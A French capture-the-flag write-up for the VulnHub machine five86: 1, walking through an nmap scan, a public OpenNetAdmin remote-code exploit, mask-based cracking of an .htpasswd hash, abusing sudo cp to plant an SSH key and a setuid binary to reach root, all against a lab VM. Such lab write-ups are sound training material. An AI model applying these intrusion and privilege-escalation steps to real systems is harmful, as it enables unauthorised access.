---
title: "Solution du CTF Five86: 1 de VulnHub"
tags: [VulnHub, CTF]
---

L'auteur de la série de CTFs *DC* avait aussi créé deux autres CTFs disponibles sur _VulnHub_. Voici donc le writeup pour [five86: 1](https://vulnhub.com/entry/five86-1,417/).

## So open I got a shell

```console
$ sudo nmap -sCV --script vuln -p- -T5 192.168.56.141
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.56.141
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|_      PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.38 (Debian)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|_  /reports/: Potentially interesting folder (401 Unauthorized)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
--- snip ---
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
| <h1>Error - Document follows</h1>
|_<p>This web server is running in SSL mode. Try the URL <a href='https://192.168.56.141:10000/'>https://192.168.56.141:10000/</a> instead.<br></p>
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <h1>Error - Document follows</h1>
|   <p>This web server is running in SSL mode. Try the URL <a href='https://192.168.56.141:10000/'>https://192.168.56.141:10000/</a> instead.<br></p>
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_      http://www.exploit-db.com/exploits/1244/
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       http://www.exploit-db.com/exploits/1997/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
MAC Address: 08:00:27:7B:58:44 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Le rapport de Nmap est assez étonnant, car il semble retourner par erreur une vulnérabilité pour `Litespeed` ainsi qu'une autre pour `phpMyAdmin` alors que le port 10000 fait tourner un `Webmin`.

Pour ce qui est du port 80 il indique la présence du fichier `robots.txt` mais ne mentionne pas l'entrée `/ona` présente qui nous amène sur une installation de `OpenNetAdmin`.

Sur _exploit-db_ je trouve [un exploit](https://www.exploit-db.com/exploits/47691) pour `OpenNetAdmin`. Son utilisation n'est pas vraiment documentée et on ne sait pas si on doit passer une URL particulière.

Finalement en passant juste l'URL de base ça fonctionne très bien :

```console
$ sh ona.sh http://192.168.56.141/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
$ pwd
/opt/ona/www
```

Ce premier shell était donc rapide.

Le seul défaut, c'est que lorsque l'on passe un `+` dans une commande le caractère est passé tel quel dans la requête HTTP (l'exploit lit le terminal en boucle et génère un payload qu'il envoie par cURL) et par conséquent traité comme un espace. On doit donc par exemple replacer un `chmod +x` en `chmod 755`.

Une fois un shell récupéré je regarde si _ONA_ utilise une base de données et c'est le cas. Mais en regardant les hashes dans la table `users` il s'avère qu'ils correspondent à des passwords trop faibles pour être utiles dans la suite du CTF.

Je vois différents utilisateurs présents dans le fichier `passwd` :

```
moss:x:1001:1001:Maurice Moss:/home/moss:/bin/bash
roy:x:1002:1002:Roy Trenneman:/home/roy:/bin/bash
jen:x:1003:1003:Jen Barber:/home/jen:/bin/bash
richmond:x:1004:1004:Richmond Avenal:/home/richmond:/bin/bash
douglas:x:1005:1005:Douglas Reynholm:/home/douglas:/bin/bash
```

Aucun utilisateur n'a de fichier qui nous est lisible.

Après avoir cherché sans succès une information concernant le _Webmin_ j'ai finalement trouvé un `.htpasswd` dans `/var/www/html` :

```console
www-data@five86-1:/$ cat /var/www/.htpasswd 
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt
```

J'ai utilisé _JtR_ de cette façon :

```bash
john --format=md5crypt   --mask='[aefhrt][aefhrt][aefhrt][aefhrt][aefhrt][aefhrt][aefhrt][aefhrt][aefhrt][aefhrt]' --length=10 hashes.txt
```

Le masque utilisé fait peut être double emploi avec l'option `--length`... Après environ 17 minutes (ça reste acceptable) le password était trouvé :

```
fatherrrrr       (douglas)
```

## Lemme copy that for you

On peut se connecter via SSH avec les identifiants. L'utilisateur a une autorisation pour exécuter `cp` avec les droits de Jen :

```console
douglas@five86-1:~$ sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (jen) NOPASSWD: /bin/cp
```

J'ai d'abord copié les fichiers de Jen ailleurs, mais d'une façon à ce qu'ils soient lisibles pour moi :

```console
douglas@five86-1:/tmp$ mkdir yolo
douglas@five86-1:/tmp$ chmod 777 yolo
douglas@five86-1:/tmp$ sudo -u jen /bin/cp --no-preserve=mode -r /home/jen/ yolo/
douglas@five86-1:/tmp$ cd yolo
douglas@five86-1:/tmp/yolo$ find jen/ -type f
jen/reports/Audit.txt
jen/reports/IT_Budget.txt
```

Les fichiers ne contiennent rien d'intéressant. On va copier une clé SSH dans le `authorized_keys` de l'utilisatrice.

```console
douglas@five86-1:/tmp$ sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/
```

À peine débarqué on nous accueille avec un autre mot de passe :

```console
$ ssh -i .ssh/key_no_pass jen@192.168.56.141
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
jen@five86-1:~$ mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/jen": 1 message 1 new
>N  1 roy@five86-1       Wed Jan 01 03:17   28/885   Monday Moss
& 1
Message 1:
From roy@five86-1 Wed Jan 01 03:17:00 2020
Envelope-to: jen@five86-1
Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500
To: jen@five86-1
Subject: Monday Moss
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
From: Roy Trenneman <roy@five86-1>
Date: Wed, 01 Jan 2020 03:17:00 -0500

Hi Jen,

As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.

But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!

Moss will understand (ha ha ha ha).

Tanks,
Roy
```

## Shall we play a game?

Cette fois l'utilisateur `moss` semble être notre dernière étape : il possède un binaire setuid root.

```console
moss@five86-1:~$ alias ls="ls -alh --color"
moss@five86-1:~$ ls
total 12K
drwx------ 3 moss moss 4.0K Jan  1  2020 .
drwxr-xr-x 7 root root 4.0K Jan  1  2020 ..
lrwxrwxrwx 1 moss moss    9 Jan  1  2020 .bash_history -> /dev/null
drwx------ 2 moss moss 4.0K Jan  1  2020 .games
moss@five86-1:~$ ls .games/
total 28K
drwx------ 2 moss moss 4.0K Jan  1  2020 .
drwx------ 3 moss moss 4.0K Jan  1  2020 ..
lrwxrwxrwx 1 moss moss   21 Jan  1  2020 battlestar -> /usr/games/battlestar
lrwxrwxrwx 1 moss moss   14 Jan  1  2020 bcd -> /usr/games/bcd
lrwxrwxrwx 1 moss moss   21 Jan  1  2020 bombardier -> /usr/games/bombardier
lrwxrwxrwx 1 moss moss   17 Jan  1  2020 empire -> /usr/games/empire
lrwxrwxrwx 1 moss moss   20 Jan  1  2020 freesweep -> /usr/games/freesweep
lrwxrwxrwx 1 moss moss   15 Jan  1  2020 hunt -> /usr/games/hunt
lrwxrwxrwx 1 moss moss   20 Jan  1  2020 ninvaders -> /usr/games/ninvaders
lrwxrwxrwx 1 moss moss   17 Jan  1  2020 nsnake -> /usr/games/nsnake
lrwxrwxrwx 1 moss moss   25 Jan  1  2020 pacman4console -> /usr/games/pacman4console
lrwxrwxrwx 1 moss moss   17 Jan  1  2020 petris -> /usr/games/petris
lrwxrwxrwx 1 moss moss   16 Jan  1  2020 snake -> /usr/games/snake
lrwxrwxrwx 1 moss moss   17 Jan  1  2020 sudoku -> /usr/games/sudoku
-rwsr-xr-x 1 root root  17K Jan  1  2020 upyourgame
lrwxrwxrwx 1 moss moss   16 Jan  1  2020 worms -> /usr/games/worms
```

À l'exécution du binaire, on pourrait penser que l'on fait fausse route et qu'il attend des mots particuliers, mais en l'ouvrant dans [GitHub - rizinorg/cutter: Free and Open Source Reverse Engineering Platform powered by rizin](https://github.com/rizinorg/cutter) on se rend compte qu'il n'y a pas d'embranchements ni de vérifications sur le contenu saisi. Quoi que l'on passe, on arrive toujours sur un `setuid(0)` + `system("/bin/sh")` final :

```console
moss@five86-1:~$ .games/upyourgame 
Would you like to play a game? a

Could you please repeat that? a

Nope, you'll need to enter that again. a

You entered: No.  Is this correct? a

We appear to have a problem?  Do we have a problem? a

Made in Britain.
# id
uid=0(root) gid=1001(moss) groups=1001(moss)
# cd /root
# ls
flag.txt
# cat flag.txt
8f3b38dd95eccf600593da4522251746
```
